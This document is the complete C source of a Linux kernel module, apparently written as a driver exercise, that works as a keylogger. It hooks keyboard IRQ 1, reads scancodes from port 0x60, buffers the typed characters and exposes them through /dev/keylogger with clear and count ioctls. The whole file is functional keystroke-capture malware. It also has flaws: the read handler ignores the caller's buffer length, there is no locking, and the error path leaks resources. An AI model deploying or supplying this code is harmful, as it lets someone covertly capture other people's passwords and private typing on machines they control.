#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/interrupt.h>
#include <linux/ioctl.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <asm/io.h>

#define DEVICE_NAME "keylogger"
#define CLASS_NAME  "klg"
#define BUF_SIZE 1024
#define KBD_IRQ 1
#define KBD_DATA_PORT 0x60

#define IOCTL_CLEAR_BUFFER _IO('k', 1)
#define IOCTL_GET_COUNT    _IOR('k', 2, int)

static int major;
static struct class *kl_class;


static char key_buffer[BUF_SIZE];
static int key_count = 0;
static int buf_pos = 0;

static const char *scancode_map[128] = {
    [0x02] = "1", [0x03] = "2", [0x04] = "3", [0x05] = "4",
    [0x06] = "5", [0x07] = "6", [0x08] = "7", [0x09] = "8",
    [0x0A] = "9", [0x0B] = "0", [0x10] = "Q", [0x11] = "W",
    [0x12] = "E", [0x13] = "R", [0x14] = "T", [0x15] = "Y",
    [0x16] = "U", [0x17] = "I", [0x18] = "O", [0x19] = "P",
    [0x1E] = "A", [0x1F] = "S", [0x20] = "D", [0x21] = "F",
    [0x22] = "G", [0x23] = "H", [0x24] = "J", [0x25] = "K",
    [0x26] = "L", [0x2C] = "Z", [0x2D] = "X", [0x2E] = "C",
    [0x2F] = "V", [0x30] = "B", [0x31] = "N", [0x32] = "M",
    [0x39] = " "
};

irqreturn_t kb_irq_handler(int irq, void *dev_id) {
    unsigned char sc = inb(KBD_DATA_PORT);

    if (sc < 0x80) {
        const char *key = scancode_map[sc];
        if (key && buf_pos < BUF_SIZE - 2) {
            int len = snprintf(&key_buffer[buf_pos], 3, "%s", key);
            buf_pos += len;
            key_count++;
        }
    }

    return IRQ_HANDLED;
}

static ssize_t dev_read(struct file *file, char __user *buf, size_t len, loff_t *offset) {
    if (*offset >= buf_pos)
        return 0;

    if (copy_to_user(buf, key_buffer, buf_pos))
        return -EFAULT;

    *offset = buf_pos;
    return buf_pos;
}

static long dev_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case IOCTL_CLEAR_BUFFER:
            memset(key_buffer, 0, BUF_SIZE);
            buf_pos = 0;
            key_count = 0;
            printk(KERN_INFO "Keylogger: Buffer cleared\n");
            break;

        case IOCTL_GET_COUNT:
            if (copy_to_user((int __user *)arg, &key_count, sizeof(int)))
                return -EFAULT;
            break;

        default:
            return -EINVAL;
    }
    return 0;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read = dev_read,
    .unlocked_ioctl = dev_ioctl,
};

static int __init kl_init(void) {
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) {
        printk(KERN_ALERT "Keylogger: Failed to register char device\n");
        return major;
    }

    kl_class = class_create(CLASS_NAME);
    device_create(kl_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);

    if (request_irq(KBD_IRQ, kb_irq_handler, IRQF_SHARED, "keyboard_irq_handler", (void *)(kb_irq_handler))) {
        printk(KERN_ALERT "Keylogger: Cannot register IRQ\n");
        return -EIO;
    }

    printk(KERN_INFO "Keylogger: Loaded successfully on /dev/%s\n", DEVICE_NAME);
    return 0;
}

static void __exit kl_exit(void) {
    free_irq(KBD_IRQ, (void *)(kb_irq_handler));
    device_destroy(kl_class, MKDEV(major, 0));
    class_destroy(kl_class);
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "Keylogger: Unloaded successfully\n");
}

module_init(kl_init);
module_exit(kl_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Hemanth");
MODULE_DESCRIPTION("Keyboard Logger using Char Device + IRQ + IOCTL");

